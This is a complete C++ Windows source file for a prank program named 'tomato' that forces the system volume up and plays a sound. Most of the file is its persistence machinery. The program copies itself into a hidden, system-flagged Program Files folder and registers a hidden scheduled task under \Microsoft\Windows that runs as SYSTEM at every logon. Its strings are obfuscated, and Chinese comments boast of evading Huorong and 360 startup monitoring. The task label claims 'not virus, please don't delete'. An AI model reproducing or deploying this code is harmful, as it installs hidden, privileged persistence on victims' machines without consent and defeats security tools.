#pragma warning (disable:4996)
#define _WIN32_DCOM

#include <iostream>
#include <comdef.h>
#include <wincred.h>
#include <taskschd.h>
#include <windows.h>
#include <mmsystem.h>
#include <mmdeviceapi.h> 
#include <endpointvolume.h>
#include <audioclient.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment (lib, "winmm.lib")

//#define DISABLE_OXORANY
#include "resource.h"
#include "oxorany/oxorany_include.h"

#ifndef _WIN64
#error use x64 build
#endif

//设置系统音量(音量范围:0~100,音量为0时静音)
bool SetVolum(int volume, int* oldvol = 0, bool unmute = true) {
    bool ret = false;
    HRESULT hr;
    IMMDeviceEnumerator* pDeviceEnumerator = 0;
    IMMDevice* pDevice = 0;
    IAudioEndpointVolume* pAudioEndpointVolume = 0;
    IAudioClient* pAudioClient = 0;

    try {
        hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pDeviceEnumerator);
        if (FAILED(hr)) throw 0; //throw "CoCreateInstance";
        hr = pDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
        if (FAILED(hr)) throw 0; //throw "GetDefaultAudioEndpoint";
        hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pAudioEndpointVolume);
        if (FAILED(hr)) throw 0; //throw "pDevice->Active";
        hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
        if (FAILED(hr)) throw 0; //throw "pDevice->Active";

        if (oldvol) {
            float f;
            pAudioEndpointVolume->GetMasterVolumeLevelScalar(&f);
            *oldvol = f * 100;
        }

        float fVolume;
        fVolume = volume / 100.0f;
        hr = pAudioEndpointVolume->SetMasterVolumeLevelScalar(fVolume, &GUID_NULL);
        if (FAILED(hr)) throw 0; //throw "SetMasterVolumeLevelScalar";

        if (unmute)pAudioEndpointVolume->SetMute(false, 0);

        pAudioClient->Release();
        pAudioEndpointVolume->Release();
        pDevice->Release();
        pDeviceEnumerator->Release();

        ret = true;
    }
    catch (...) {
        if (pAudioClient) pAudioClient->Release();
        if (pAudioEndpointVolume) pAudioEndpointVolume->Release();
        if (pDevice) pDevice->Release();
        if (pDeviceEnumerator) pDeviceEnumerator->Release();
        throw;
    }

    return ret;
}
/*
//获取系统音量
int GetVolume()
{
    int volumeValue = 0;
    HRESULT hr;
    IMMDeviceEnumerator* pDeviceEnumerator = 0;
    IMMDevice* pDevice = 0;
    IAudioEndpointVolume* pAudioEndpointVolume = 0;
    IAudioClient* pAudioClient = 0;

    try {
        hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pDeviceEnumerator);
        if (FAILED(hr)) throw 0; //throw "CoCreateInstance";
        hr = pDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
        if (FAILED(hr)) throw 0; //throw "GetDefaultAudioEndpoint";
        hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pAudioEndpointVolume);
        if (FAILED(hr)) throw 0; //throw "pDevice->Active";
        hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
        if (FAILED(hr)) throw 0; //throw "pDevice->Active";

        float fVolume;
        hr = pAudioEndpointVolume->GetMasterVolumeLevelScalar(&fVolume);
        if (FAILED(hr)) throw 0; //throw "SetMasterVolumeLevelScalar";

        pAudioClient->Release();
        pAudioEndpointVolume->Release();
        pDevice->Release();
        pDeviceEnumerator->Release();

        volumeValue = fVolume * 100;
    }
    catch (...) {
        if (pAudioClient) pAudioClient->Release();
        if (pAudioEndpointVolume) pAudioEndpointVolume->Release();
        if (pDevice) pDevice->Release();
        if (pDeviceEnumerator) pDeviceEnumerator->Release();
        throw;
    }

    return volumeValue;
}
*/

int add() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        //printf("\nCoInitializeEx failed: %x", hr);
        return 1;
    }

    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(hr))
    {
        //printf("\nCoInitializeSecurity failed: %x", hr);
        CoUninitialize();
        return 1;
    }

    LPCWSTR wszTaskName = oxorany(L"tomato");//名称

    std::wstring wstrExecutablePath = oxorany(L"C:\\Program Files\\tomato\\tomato.exe");

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);
    if (FAILED(hr))
    {
        //printf("Failed to create an instance of ITaskService: %x", hr);
        CoUninitialize();
        return 1;
    }

    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        //printf("ITaskService::Connect failed: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }


    //路径藏得深点，降低被发现的概率(汗)
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\Microsoft\\Windows"), &pRootFolder);
    hr = pRootFolder->CreateFolder(_bstr_t(L"tomato"), { 0 }, &pRootFolder);
    if (FAILED(hr)) {
        //printf("Cannot get Root folder pointer: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);

    pService->Release();
    if (FAILED(hr))
    {
        //printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
        pRootFolder->Release();
        CoUninitialize();
        return 1;
    }

    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (FAILED(hr))
    {
        //printf("\nCannot get identification pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRegInfo->put_Description((BSTR)oxorany(L"not virus, please don't delete :)"));//描述
    if (FAILED(hr))
    {
        //printf("\nCannot put identification info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRegInfo->put_Author((BSTR)oxorany(L"tomato forker"));//创建者
    pRegInfo->Release();
    if (FAILED(hr))
    {
        //printf("\nCannot put identification info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Create the principal for the task - these credentials
    //  are overwritten with the credentials passed to RegisterTaskDefinition
    IPrincipal* pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (FAILED(hr))
    {
        //printf("\nCannot get principal pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //以最高权限运行
    hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
    if (FAILED(hr))
    {
        //printf("\nCannot put principal info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //以SYSTEM账户运行
    hr = pPrincipal->put_UserId((BSTR)oxorany(L"SYSTEM"));
    if (FAILED(hr))
    {
        //printf("\nCannot put principal info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Set up principal logon type to interactive logon
    hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
    pPrincipal->Release();
    if (FAILED(hr))
    {
        //printf("\nCannot put principal info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (FAILED(hr))
    {
        //printf("\nCannot get settings pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //禁用仅交流电源
    hr = pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
    if (FAILED(hr)) {
        //printf("\nCannot put setting information: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //隐藏计划任务，可绕过火绒启动项管理(无法绕过火绒剑和360的启动项管理)
    //现在火绒剑下架了，windows自带的计划任务又不能搜索，路径藏深点，火绒用户不使用专业的ARK工具根本找不到启动项在哪里(笑)
    hr = pSettings->put_Hidden(VARIANT_TRUE);
    if (FAILED(hr)) {
        //printf("\nCannot put setting information: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Set setting values for the task.  
    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    pSettings->Release();
    if (FAILED(hr))
    {
        //printf("\nCannot put setting information: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //触发器
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr))
    {
        //printf("\nCannot get trigger collection: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //当任何用户登录时
    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr))
    {
        //printf("\nCannot create trigger: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //操作
    IActionCollection* pActionCollection = NULL;

    //  Get the task action collection pointer.
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr))
    {
        //printf("\nCannot get Task collection pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Create the action, specifying that it is an executable action.
    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr))
    {
        //printf("\nCannot create the action: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IExecAction* pExecAction = NULL;
    //  QI for the executable task pointer.
    hr = pAction->QueryInterface(
        IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr))
    {
        //printf("\nQueryInterface call failed for IExecAction: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //启动程序
    hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath.c_str()));
    if (FAILED(hr))
    {
        //printf("\nCannot put action path: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    /*
    //启动程序的命令行
    hr = pExecAction->put_Arguments(_bstr_t("-c (New-Object Media.SoundPlayer 'C:\\tomato\\tomato.wav').PlaySync();"));
    pExecAction->Release();
    if (FAILED(hr))
    {
        //printf("\n无法设置操作命令行：%x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    */

    //保存计划任务
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(wszTaskName),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);
    if (FAILED(hr))
    {
        //printf("\nError saving the Task : %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //printf("\n Success! Task successfully registered. ");

    //  Clean up.
    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
    return 0;
}

int bb(int a) {
    //使用计划任务进行权限维持，可绕过火绒和无晶核的360
#ifndef _DEBUG
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(0, path, MAX_PATH);
    if (wcscmp(path, oxorany(L"C:\\Program Files\\tomato\\tomato.exe"))) {
        CreateDirectoryW(oxorany(L"C:\\Program Files\\tomato"), 0);
        CopyFileW(path, oxorany(L"C:\\Program Files\\tomato\\tomato.exe"), false);

        SetFileAttributesW(oxorany(L"C:\\Program Files\\tomato\\tomato.exe"), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
        SetFileAttributesW(oxorany(L"C:\\Program Files\\tomato"), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

        if (add()) {
            MessageBoxW(0, oxorany(L"failed"), 0, 0);
        }
        exit(0);
    }
#endif

    return a ? --a : ++a;
}

int aa(int c) {
    volatile int a = rand();
    volatile int b = rand();
    return bb(a ? b + a + c : c - b - a);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {
    volatile int c = aa(rand());
    c = rand() ? 50 : 50;

    CoInitialize(0);
    SetVolum(c);
    CoUninitialize();

    //powershell -c (New-Object Media.SoundPlayer 'tomato.wav').PlaySync();
    if (!PlaySoundW(MAKEINTRESOURCE(IDR_WAVE1), 0, SND_RESOURCE | SND_SYNC)) {
        MessageBoxW(0, oxorany(L"failed"), 0, 0);
    }

    return 0;
}
